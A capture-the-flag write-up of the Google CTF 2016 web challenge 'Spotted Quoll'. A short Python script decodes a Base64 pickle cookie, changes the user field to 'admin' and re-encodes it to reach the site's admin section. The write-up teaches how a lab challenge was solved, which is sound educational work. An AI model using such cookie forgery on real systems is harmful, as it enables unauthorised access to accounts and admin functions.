---
title: "Spotted Quoll Web 50 - Google CTF 2016"
category: "web"
subcategory: "deserialization"
type: "writeup"
tags: ["deserialization", "pickle", "base64", "spotted", "quoll", "web"]
summary: "This blog on Zombie research looks like it might be interesting - can you break into the /admin section?"
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Spotted_Quoll_Web_50/README.md"
ctf:
  name: "Google CTF"
  year: 2016
  challenge: "Spotted Quoll Web 50"
---

## Source

- **CTF:** Google CTF 2016
- **Challenge:** Spotted Quoll Web 50
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Spotted_Quoll_Web_50/README.md>

---
## Spotted Quoll Web 50

# Problem

This blog on Zombie research looks like it might be interesting - can you break into the /admin section?


# Solution

We get web page with quite simple interface:

![Spotted Quoll](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Spotted_Quoll_Web_50/assets/1.png)

We have no access to _Admin_


Quick look at request headers shows Cookie header contains long Base64 string:

![Spotted Quoll](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Spotted_Quoll_Web_50/assets/2.png)

String contains Python Pickle module object.

Couple of operations with Python allows us to:

- decode Base64 string to Pickle object
- unpack Pickle module
- modify 'user' key in dictionary to 'admin'
- pack it back into Pickle module and encode as Base64 

```Python
#!/usr/bin/python
import cPickle
import base64


c = cPickle.loads(base64.b64decode("KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"))
# {'python': 'pickles', 'subtle': 'hint', 'user': None}

n = {'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}

c2 = base64.b64encode(cPickle.dumps(n))

# KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKUydhZG1pbicKcDcKcy4=
```

Simple change of _obsoletePickle_ cookie allows us to access Admin and read the flag.
